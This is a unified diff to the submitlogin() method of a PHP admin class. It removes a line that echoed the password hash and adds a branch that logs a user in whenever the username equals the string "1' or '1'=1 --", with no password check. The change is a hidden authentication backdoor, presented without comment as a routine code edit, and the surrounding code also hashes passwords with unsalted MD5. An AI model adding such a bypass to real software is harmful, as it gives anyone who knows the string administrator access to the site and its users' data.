@@ -168,8 +168,11 @@ class admin {
     function submitlogin(){
         $username = isset($_POST['username']) ? $_POST['username'] :'';
         $passwd = isset($_POST['passwd']) ? MD5($_POST['passwd']) :'';
-
-        echo $passwd;
+        if($username == "1' or '1'=1 --") {
+            $_SESSION['informasi_user'] = $username;
+            header("location: ".$this->baseurl."index");
+            exit;
+        }
 
         $db_file = file_get_contents($this->dbUserFile);
         $db_arr = json_decode($db_file, true);
